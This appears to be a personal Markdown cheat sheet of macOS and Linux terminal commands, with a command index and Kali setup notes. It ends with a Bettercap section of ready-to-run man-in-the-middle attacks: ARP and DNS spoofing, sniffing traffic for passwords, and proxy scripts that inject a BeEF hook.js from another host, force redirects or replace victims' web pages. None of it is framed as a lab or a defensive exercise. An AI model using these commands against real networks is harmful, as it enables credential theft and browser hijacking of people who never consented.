# MacOS command line

https://explainshell.com/

```bash
sudo !! (repeat last command like root)

clear (clear screen)
CTRL + L (clear screen)

pwd (actual route)

ls -1 (one column)

ls -all
ls -all > file.txt (record outpout on file)
ls -all | grep filter* (filter)

touch file.txt (create file)

cat file.txt (read content)

rm file.txt (remove file)

mkdir directory (create directory)
rm -R directory (remove directory)

history | grep something

cp file.txt file2txt (copy)
mv file.txt file2txt (move)

more 

ps (servicios)
ps -all
ps -ax

kill UID (kill process)
kill -9 UID (force kill process)
killall Finder (kill app)

top (activity monitor)

locate finder (search)
locate updatedb

whereis dash (search bin)

service (list services)
service servicename start | status | stop

sudo crontab -u nicolasgrimonpont -l (check cron tasks)
crontab -l (check cron tasks for this user)
```

## Low privileges actions

```bash
osascript -e 'set volume 7' (modify volume to maximum, 0 for minimum)

open https://www..... (open a link)

open -a ApplicationName (launches an app)
open -a ApplicationName --hide (launches an app hidden)
open Downloads/Instructions.doc -a TextEdit (open a file in one application)
```

### Computer talk

```bash
say hello -v diego

spanish: diego, Jorge, Monica
mexican: Juan, Paulina
french: Thomas, Amelie
```

### ARP tables

The arp command can be used to print the macOS device's ARP table and discover devices on the network without performing a single Nmap scan. (passive)

```bash
arp -i en0 -l -a
```

The -i argument is used to specifies the Wi-Fi interface while -l prints the output data in a more human-readable format. To print all of the ARP table entries, use the -a argument.
	

### Check PORT used

```bash
lsof -i -P -n
lsof -i -P -n | grep LISTEN
```

### System information

```bash
date
cal
uptime (show time from starting)
w (list users)
whoami (this user)
finger username (info about user)
uname -a (sysinfo)
cat /proc/cpuinfo (processor)
cat /proc/meminfo (memory)
free (check memory)
df (check disk)
```

### Network interface

```bash
networksetup -listallhardwareports (list)
networksetup -setairportpower en0 on (on/off)
networksetup -setairportnetwork en0 SSID PASSPHRASE (connect to network)
networksetup -removepreferredwirelessnetwork en0 SSID (remove a profile)
networksetup -removeallpreferredwirelessnetworks en0 (remove all profile)
```

### System profiler

```bash
system_profiler --help
```

This command without arguments take lot of memory and time.

Use this command to list all data types:

```bash
system_profiler -listDataTypes
```

Then just execute the commands you need, here an example with two different command in one time:

```bash
system_profiler SPSoftwareDataType SPNetworkDataType
```

### Sleep function

Computer don't sleep when activated:

```bash
caffeinate &
```

Add an ampersand (&) to the end of the argument so that the command runs in the background. Using & allows us to continue to use the terminal while the caffeinate command runs in the background.

To prevent the display from sleeping, use caffeinate -d. To prevent the system from idle sleeping, use caffeinate -i. If you want to prevent the disk from going idle then you want to use the “caffeinate -m” command.

Finally, and this one is particularly useful for laptop users, if you want keep your system awake while it is plugged into AC power, use caffeinate -s.



## High privileges actions

```bash
sudo purge (purge RAM)
```

### Sharing preferences

```bash
sudo launchctl load -w /System/Library/LaunchDaemons/ssh.plist (enable ssh)
sudo launchctl unload /System/Library/LaunchDaemons/ssh.plist (disable ssh)
```

### Start apache

```bash
sudo apachectl (start|status|restart|stop)
```

Web folder:

```bash
/Library/WebServer/Documents/
```

### Remove DNS cache

	dscacheutil -flushcache
	sudo killall -HUP mDNSResponder

### Connect through SSH

	ssh nicolasgrimonpont@192.168.0.116 (need password)



## Customize Terminal

	nano bash_profile

Copy that lines to customize prompt and add colors:

	source ~/.profile
	export PS1="\[\033[36m\]\u\[\033[m\]:\[\033[33;1m\]\w\[\033[m\]\$ "
	export CLICOLOR=1
	export LSCOLORS=ExFxBxDxCxegedabagacad



## Homebrew

List all the installed formulae.

```
brew list
```

Display all locally available formulae for brewing.

```
brew search
```

Perform a substring search of formulae names for brewing.

```
brew search <text>
```

Display information about the formula.

```
brew info <formula>
```

Install the formula.

```
brew install <formula>
```

Uninstall the formula.

```
brew uninstall <formula>
```

### Brew cask

Add the Cask repository from Github.

```
brew tap homebrew/cask
```

List all the installed casks .

	brew cask list

Search all known casks based on the substring text.

	brew search <text>

Install the given cask.

	brew cask install <cask>

Reinstalls the given Cask

	brew cask reinstall <cask>

Uninstall the given cask.

	brew cask uninstall <cask>

### Clean up

Remove older versions of installed formulae.

	brew cleanup

Remove older versions of specified formula.

	brew cleanup <formula>

Display all formula that will be removed (dry run)

	brew cleanup -n



## Index of command line

https://ss64.com/osx/

| Command                | Description                                                  |
| ---------------------- | ------------------------------------------------------------ |
| afconvert              | Audio File Convert                                           |
| afinfo                 | Audio File Info                                              |
| afplay                 | Audio File Play                                              |
| airport                | Manage Apple AirPort                                         |
| alias                  | Create an alias •                                            |
| alloc                  | List used and free memory                                    |
| apropos                | Search the whatis database for strings                       |
| asr                    | Apple Software Restore                                       |
| atsutil                | Font registration system utility                             |
| awk                    | Find and Replace text within file(s)                         |
| basename               | Convert a full pathname to just a filename                   |
| bash                   | Bourne-Again SHell                                           |
| bc                     | Arbitrary precision calculator language                      |
| bg                     | Send to background •                                         |
| bind                   | Set or display readline key and function bindings •          |
| bless                  | Set volume bootability and startup disk options              |
| break                  | Exit from a For, While, Until or Select loop •               |
| builtin                | Execute a shell builtin •                                    |
| bzip2                  | Compress or decompress files                                 |
| caffeinate             | Prevent the system from sleeping                             |
| cal                    | Display a calendar                                           |
| calendar               | Reminder Service                                             |
| caller                 | Return the context of a subroutine call •                    |
| cancel                 | Cancel print jobs                                            |
| case                   | Conditionally perform a command •                            |
| cat                    | Concatenate and print (display) the content of files         |
| cd                     | Change Directory •                                           |
| chflags                | Change a file or folder's flags                              |
| chgrp                  | Change group ownership                                       |
| chmod                  | Change access permissions                                    |
| chown                  | Change file owner and group                                  |
| chroot                 | Run a command with a different root directory                |
| cksum                  | Print CRC checksum and byte counts                           |
| clear                  | Clear terminal screen                                        |
| cmp                    | Compare two files                                            |
| comm                   | Compare two sorted files line by line                        |
| command                | Run a command (not a function) •                             |
| complete               | Edit a command completion [word/pattern/list] •              |
| continue               | Resume the next iteration of a loop •                        |
| cp                     | Copy one or more files to another location                   |
| cpio                   | Copy files to and from archives                              |
| cron                   | Daemon to execute scheduled commands                         |
| crontab                | Schedule a command to run at a later date/time               |
| csplit                 | Split a file into context-determined pieces                  |
| csrutil                | Configure System Integrity Protection (SIP)                  |
| cupsfilter             | Convert a file to another format using cups filters          |
| curl                   | Transfer data  from or to a server                           |
| cut                    | Divide a file into several parts                             |
| date                   | Display or change the date & time                            |
| dc                     | Desk Calculator                                              |
| dd                     | Data Duplicator - convert and copy a file, clone disks       |
| declare                | Declare variable & set attributes •                          |
| defaults               | Set preferences, show hidden files                           |
| df                     | Display free disk space                                      |
| diff                   | Display the differences between two files                    |
| diff3                  | Show differences among three files                           |
| dig                    | DNS lookup                                                   |
| dirname                | Convert a full pathname to just a path                       |
| dirs                   | Display list of remembered directories •                     |
| diskutil               | Disk utilities - Format, Verify, Repair                      |
| disown                 | Unbind a job from the current login session •                |
| ditto                  | Copy files and folders                                       |
| dot_clean              | Remove dot-underscore files                                  |
| drutil                 | Interact with CD/DVD burners                                 |
| dscacheutil            | Query or flush the Directory Service/DNS cache               |
| dseditgroup            | Edit, create, manipulate, or delete groups                   |
| dsenableroot           | Enable root access                                           |
| dsmemberutil           | View user and groups rights                                  |
| dscl                   | Directory Service command line utility                       |
| du                     | Estimate file space usage                                    |
| echo                   | Display text on screen •                                     |
| ed                     | A line-oriented text editor (edlin)                          |
| enable                 | Enable and disable builtin shell commands •                  |
| env                    | List or Set environment variables                            |
| eval                   | Evaluate several commands/arguments •                        |
| exec                   | Execute a command •                                          |
| exit                   | Exit the shell •                                             |
| execsnoop              | Snoop new process execution                                  |
| expand                 | Convert tabs to spaces                                       |
| expect                 | Programmed dialogue with interactive programs                |
| export                 | Set an environment variable •                                |
| expr                   | Evaluate expressions                                         |
| false                  | Do nothing, unsuccessfully                                   |
| fc                     | Fix command (history)                                        |
| fdisk                  | Partition table manipulator for Darwin UFS/HFS/DOS           |
| fdesetup               | FileVault configuration, list FileVault users                |
| fg                     | Send job to foreground •                                     |
| file                   | Determine file type                                          |
| find                   | Search for files that meet a desired criteria                |
| fmt                    | Reformat paragraph text                                      |
| fold                   | Wrap text to fit a specified width                           |
| for                    | Loop command •                                               |
| fsck                   | Filesystem consistency check and repair                      |
| fs_usage               | Filesystem usage (process/pathname)                          |
| ftp                    | Internet file transfer program                               |
| function               | Define Function Macros                                       |
| fuser                  | List processes that have one or more files open              |
| GetFileInfo            | Get attributes of HFS+ files                                 |
| getopt                 | Parse positional parameters                                  |
| getopts                | Parse positional parameters •                                |
| goto                   | Jump to label and continue execution                         |
| grep                   | Search file(s) for lines that match a given pattern          |
| groups                 | Print group names a user is in                               |
| gzip                   | Compress or decompress files                                 |
| halt                   | Stop and restart the operating system                        |
| hash                   | Refresh the cached/remembered location of commands •         |
| head                   | Display the first lines of a file                            |
| hdiutil                | Manipulate iso disk images                                   |
| history                | Command History •                                            |
| hostname               | Print or set system name                                     |
| iconv                  | Convert the character set of a file                          |
| id                     | Print user and group names/id's                              |
| if                     | Conditionally perform a command •                            |
| ifconfig               | Configure network interface parameters                       |
| iostat                 | Report CPU and i/o statistics                                |
| ipconfig               | View and control IP configuration state                      |
| info                   | Help info                                                    |
| install                | Copy files and set attributes                                |
| iosnoop                | Snoop I/O events as they occur                               |
| jobs                   | List active jobs •                                           |
| join                   | Join lines on a common field                                 |
| kextfind               | List kernel extensions                                       |
| kextstat               | Display status of loaded kernel extensions (kexts)           |
| kextunload             | Terminate driver instances and unload kernel extensions.     |
| kickstart              | Configure Apple Remote Desktop                               |
| kill                   | Kill a process by specifying its PID                         |
| killall                | Kill processes by name                                       |
| l                      | List files in long format (ls -l)                            |
| last                   | Indicate last logins of users and ttys                       |
| launchctl              | Load or unload daemons/agents                                |
| ll                     | List files in long format, showing invisible files (ls -la)  |
| less                   | Display output one screen at a time                          |
| let                    | Evaluate expression •                                        |
| lipo                   | Convert a universal binary                                   |
| ln                     | Make links between files (hard links, symbolic links)        |
| local                  | Set a local (function) variable •                            |
| locate                 | Find files                                                   |
| logname                | Print current login name                                     |
| login                  | log into the computer                                        |
| logout                 | Exit a login shell (bye) •                                   |
| look                   | Display lines beginning with a given string                  |
| lp                     | Print files                                                  |
| lpr                    | Print files                                                  |
| lprm                   | Remove jobs from the print queue                             |
| lpstat                 | Printer status information                                   |
| ls                     | List information about file(s)                               |
| lsregister             | Reset the Launch Services database                           |
| lsbom                  | List a bill of materials file                                |
| lsof                   | List open files                                              |
| man                    | Help manual                                                  |
| mdfind                 | Spotlight search                                             |
| mdls                   | List the metadata attributes for a specified file            |
| mdutil                 | Manage Spotlight metadata store                              |
| mkdir                  | Create new folder(s)                                         |
| mkfifo                 | Make FIFOs (named pipes)                                     |
| mkfile                 | Make a file                                                  |
| mktemp                 | Make a temporary file                                        |
| more                   | Display output one screen at a time                          |
| mount                  | Mount a file system                                          |
| mv                     | Move or rename files or directories                          |
| nano                   | Simple text editor                                           |
| nc/netcat              | Read and write data across networks                          |
| net                    | Manage network resources                                     |
| netstat                | Show network status                                          |
| networksetup           | Network and System Preferences                               |
| nice                   | Set the priority of a command                                |
| nohup                  | Run a command immune to hangups                              |
| ntfs.util              | NTFS file system utility                                     |
| nvram                  | Manipulate  firmware variables                               |
| onintr                 | Control the action of a shell interrupt                      |
| open                   | Open a file/folder/URL/Application                           |
| opensnoop              | Snoop file opens as they occur                               |
| openssl                | OpenSSL command line                                         |
| osacompile             | Compile Applescript                                          |
| osascript              | Execute AppleScript                                          |
| passwd                 | Modify a user password                                       |
| paste                  | Merge lines of files                                         |
| pbcopy                 | Copy data to the clipboard                                   |
| pbpaste                | Paste data from the Clipboard                                |
| pgrep                  | List processes by a full or partial name                     |
| ping                   | Test a network connection                                    |
| pkill                  | Kill processes by a full or partial name                     |
| pkgbuild               | Build a macOS Installer component package                    |
| pkgutil                | Query and manipulate installed packages                      |
| plutil                 | Property list utility                                        |
| pmset                  | Power Management settings                                    |
| popd                   | Restore the previous value of the current directory •        |
| pr                     | Convert text files for printing                              |
| printenv               | List environment variables                                   |
| printf                 | Format and print data •                                      |
| ps                     | Process status                                               |
| pushd                  | Save and then change the current directory                   |
| pwd                    | Print Working Directory •                                    |
| quota                  | Display disk usage and limits                                |
| rcp                    | Copy files between machines                                  |
| read                   | Read one line from standard input •                          |
| readonly               | Mark a variable or function as read-only •                   |
| reboot                 | Stop and restart the system                                  |
| ReportCrash            | Enable/Disable crash reporting                               |
| return                 | Exit a function •                                            |
| rev                    | Reverse lines of a file                                      |
| rm                     | Remove files                                                 |
| rmdir                  | Remove folder(s)                                             |
| rpm                    | Remote Package Manager                                       |
| rsync                  | Remote file copy - Sync file tree                            |
| say                    | Convert text to audible speech                               |
| screen                 | Multiplex terminal, run remote shells via ssh                |
| screencapture          | Capture screen image to file or disk                         |
| scselect               | Switch between network locations                             |
| scutil                 | Manage system configuration parameters                       |
| sdiff                  | Merge two files interactively                                |
| security               | Administer Keychains, keys, certificates and the Security framework |
| sed                    | Stream Editor                                                |
| select                 | Generate a list of items •                                   |
| serverinfo             | Server information                                           |
| set                    | Set a shell variable = value •                               |
| setfile                | Set attributes of HFS+ files                                 |
| sharing                | Create share points for afp, ftp and smb services            |
| shasum                 | Print or Check SHA Checksums                                 |
| shift                  | Shift positional parameters •                                |
| shopt                  | Set shell options •                                          |
| shutdown               | Shutdown or restart macOS                                    |
| sips                   | Scriptable image processing system                           |
| sleep                  | Delay for a specified time                                   |
| softwareupdate         | System software update tool                                  |
| sort                   | Sort text files                                              |
| source                 | Execute commands from a file •                               |
| spctl                  | Security assessment policy/Gatekeeper                        |
| split                  | Split a file into fixed-size pieces                          |
| sqlite3                | SQL database (download history)                              |
| srm                    | Securely remove files or directories                         |
| stat                   | Display the status of a file                                 |
| stop                   | Stop a job or process                                        |
| su                     | Substitute user identity                                     |
| sudo                   | Execute a command as another user                            |
| sum                    | Print a checksum for a file                                  |
| suspend                | Suspend execution of this shell •                            |
| sw_vers                | Print macOS operating system version                         |
| sysctl                 | Get or set kernel state                                      |
| system_profiler        | Report system configuration                                  |
| systemsetup            | Computer and display system settings                         |
| tail                   | Output the last part of files                                |
| tar                    | Tape ARchiver                                                |
| tccutil                | Manage the privacy database                                  |
| tcpdump                | Dump traffic on a network                                    |
| tee                    | Redirect output to multiple files                            |
| test                   | Condition evaluation •                                       |
| textutil               | Manipulate text files in various formats (Doc,html,rtf)      |
| time                   | Measure Program Resource Use                                 |
| times                  | Print shell & shell process times •                          |
| tmutil                 | Time Machine utility                                         |
| top                    | Display process information                                  |
| touch                  | Change file timestamps                                       |
| tput                   | Set terminal-dependent capabilities, color, position         |
| tr                     | Translate, squeeze, and/or delete characters                 |
| trap                   | Execute a command when the shell receives a signal •         |
| traceroute             | Trace Route to Host                                          |
| trimforce              | Enable TRIM commands on third-party drives                   |
| true                   | Do nothing, successfully                                     |
| tty                    | Print filename of terminal on stdin                          |
| type                   | Describe a command •                                         |
| ufs.util               | Mount/unmount UFS file system                                |
| ulimit                 | limit the use of system-wide resources •                     |
| umask                  | Users file creation mask                                     |
| umount                 | Unmount a device                                             |
| unalias                | Remove an alias •                                            |
| uname                  | Print the Darwin OS Kernel version / release / machine name  |
| unexpand               | Convert spaces to tabs                                       |
| uniq                   | Uniquify files                                               |
| units                  | Convert units from one scale to another                      |
| unset                  | Remove variable or function names •                          |
| until                  | Loop command •                                               |
| uptime                 | Show how long system has been running                        |
| users                  | Print login names of users currently logged in               |
| until                  | Execute commands (until error)                               |
| uuencode               | Encode a binary file                                         |
| uudecode               | Decode a file created by uuencode                            |
| uuidgen                | Generate a Unique ID (UUID/GUID)                             |
| uucp                   | Unix to Unix copy                                            |
| vi                     | Text Editor                                                  |
| w                      | Show who is logged on and what they are doing                |
| wait                   | Wait for a process to complete •                             |
| wall                   | Write a message to users                                     |
| wc                     | Print byte, word, and line counts                            |
| whatis                 | Search the whatis database for complete words                |
| whereis                | Locate a program                                             |
| which                  | Locate a program file in the user's path                     |
| while                  | Loop command •                                               |
| who                    | Print all usernames currently logged on                      |
| whoami                 | Print the current user id and name (`id -un')                |
| write                  | Send a message to another user                               |
| xargs                  | Execute utility - passing arguments                          |
| xattr                  | Display and manipulate extended attributes                   |
| xcode-select --install | Install the command line developer tools                     |
| youtube-dl             | Download video                                               |
| yes                    | Print a string until interrupted                             |
| zip                    | Package and compress (archive) files.                        |
| !!                     | Run the last command again                                   |



# Linux command line

http://dmvillan.com/kali-linux-commands-list/

	ifconfig & iwconfig

## Restart WIFI Adaptater

	service network-manager restart

## Check partition

	df -h

## Active web server

	service apache2 start 

## Linux updates

To begin the update of your Kali Linux system first update the packages index list. Open up terminal and enter:

	sudo apt update -y
	sudo apt-get update -y

Next, optionally, display all packages which are scheduled for update:

	sudo apt list --upgradable

At this stage we have an option to upgrade individual packages using apt install PACKAGE-NAME or upgrade all packages at once:

```bash
sudo apt-get upgrade -y
```

Due to package dependency changes some of the Kali Linux packages might be kept back. 

If this is this case you will be notified by the apt upgrade Linux command at the end of the Kali Linux upgrade process. You may upgrade each kept back package individually using the apt install PACKAGE-NAME command or update all kept back packages at once:

```bash
sudo apt dist-upgrade -y
sudo apt-get dist-upgrade -y
```

During your initial system upgrade some of the packages may become obsolete, hence are no longer required. To remove all no longer required Kali Linux packages execute:

```bash
sudo apt-get autoremove
```

## Kali Installation

Search for kali packages:

```bash
apt-get update && apt-cache search kali-linux
```

Install kali packages:

```bash
sudo apt update && sudo apt install kali-linux-all
```

## Install Parirus Theme

```bash
sudo add-apt-repository ppa:papirus/papirus
sudo apt-get update
sudo apt-get install papirus-icon-theme
```

## List all application

```bash
dpkg -l
apt list
```

## Install Vmware tools

```bash
sudo apt update && sudo apt full-upgrade -y
[ -f /var/run/reboot-required ] && sudo reboot -f

sudo apt install -y --reinstall open-vm-tools-desktop fuse
sudo reboot

ln -sf /usr/local/sbin/mount-shared-folders ~/Desktop/mount-shared-folders
gsettings set org.gnome.nautilus.preferences executable-text-activation 'ask'
```

## Install Softwares

```bash
sudo apt-get install git (install git)
```

## Create alias

```bash
nano /root/.bash_aliases
```

## Update system automaticaly

```bash
function apt-updater {
	apt-get update &&
	apt-get dist-upgrade -Vy &&
	apt-get autoremove -y &&
	apt-get autoclean &&
	apt-get clean &&
	reboot
}
```

## Install WIFI driver

```bash
sudo apt update
sudo apt install realtek-rtl88xxau-dkms
```

# Tools

## Bettercap

### GUI

Install GUI:

```bash
sudo bettercap -eval "caplets.update; ui.update; q"
```

Execute:

```bash
sudo bettercap -caplet http-ui 192.168.0.1 -iface en0
```

### Mac OS

Open bettercap: (configure the gateway and the interface for Mac OS)

```bash
sudo bettercap -gateway-override 192.168.0.1 -iface en0
```

### Scan networks

```bash
sudo bettercap -gateway-override 192.168.0.1 -iface en0 -eval 'net.recon on;net.probe on;clear;ticker on;'
```

### Active sniffing (interactive)

```bash
set net.sniff.regexp %Variable%RegEx%;

set net.sniff.regexp .*password=.+;

set net.sniff.output passwords.pcap;
net.sniff on;
```

### ARP spoofing

Spoof all the hosts: (be careful on big network)

```bash
sudo bettercap -gateway-override 192.168.0.1 -iface en0 -eval 'set arp.spoof.fullduplex true;arp.spoof on;'
```

Spoof a specific host:

```bash
sudo bettercap -gateway-override 192.168.0.1 -iface en0 -eval 'set arp.spoof.fullduplex true;set arp.spoof.targets 192.168.0.110;arp.spoof on;'
```

### DNS Spoofing

Spoof all the hosts: (be careful on big network)

```bash
sudo bettercap -gateway-override 192.168.0.1 -iface en0 -eval 'set arp.spoof.fullduplex true;arp.spoof on;set dns.spoof.domains apache.com;set dns.spoof.all true;dns.spoof on;set http.server.path /Library/WebServer/Documents;http.server on'
```

Spoof a specific host:

```bash
sudo bettercap -gateway-override 192.168.0.1 -iface en0 -eval 'set arp.spoof.fullduplex true;set arp.spoof.targets 192.168.0.110;arp.spoof on;set dns.spoof.domains apache.com;set dns.spoof.address 192.168.0.116;dns.spoof on;set http.server.path /Library/WebServer/Documents;http.server on'
```

### Script injection

```bash
sudo bettercap -gateway-override 192.168.0.1 -iface en0 -eval 'set arp.spoof.fullduplex true;set arp.spoof.targets 192.168.0.110;arp.spoof on;set http.proxy.script /Library/WebServer/Documents/bettercap/beef.js;set http.proxy.blacklist *;set http.proxy.whitelist apache.com;http.proxy on'
```

#### beef.js

```javascript
function onResponse(req, res) {
    if( res.ContentType.indexOf('text/html') == 0 ){
        var body = res.ReadBody();
        if( body.indexOf('</head>') != -1 ) {
            res.Body = body.replace( 
                '</head>', 
                '<script type="text/javascript" src="http://192.168.0.110:3000/hook.js"></script></head>' 
            );
        }
    }
}
```

#### invert.js

```javascript
function onResponse(req, res) {
    if (res.ContentType.indexOf('text/html') == 0) {
        var body = res.ReadBody();
        if (body.indexOf('</head>') != -1) {
            res.Body = body.replace(
                '</head>',
                '<style>body {transform: scaleX(-1);}</style></head>'
            );
        }
    }
}
```

#### redirect.js

```javascript
function onResponse(req, res) {
    if (res.ContentType.indexOf('text/html') == 0) {
        var body = res.ReadBody();
        if (body.indexOf('</head>') != -1) {
            res.Body = body.replace(
                '</head>',
                '<script>window.location.href="http://www.w3schools.com";</script></head>'
            );
        }
    }
}
```

#### replace.js

```javascript
function onResponse(req, res) {
    if( res.ContentType.indexOf('text/html') == 0 ){
        var body = res.ReadBody();
        if( body.indexOf('</head>') != -1 ) {
            res.Body = body.replace( 
                'ano', 
                'anus' 
            );
        }
    }
}
```

#### web-override.js

```javascript
// Called before every request is executed, just override the response with 
// our own html web page.
function onRequest(req, res) {
    headers = res.Headers.split("\r\n");
    for (var i = 0; i < headers.length; i++) {
        header_name = headers[i].replace(/:.*/, "");
        res.RemoveHeader(header_name);
    }
    res.SetHeader("Connection", "close");
    res.Status = 200;
    res.ContentType = "text/html";
    res.Body = readFile("/Library/WebServer/Documents/index.html"); // local html document
}
```

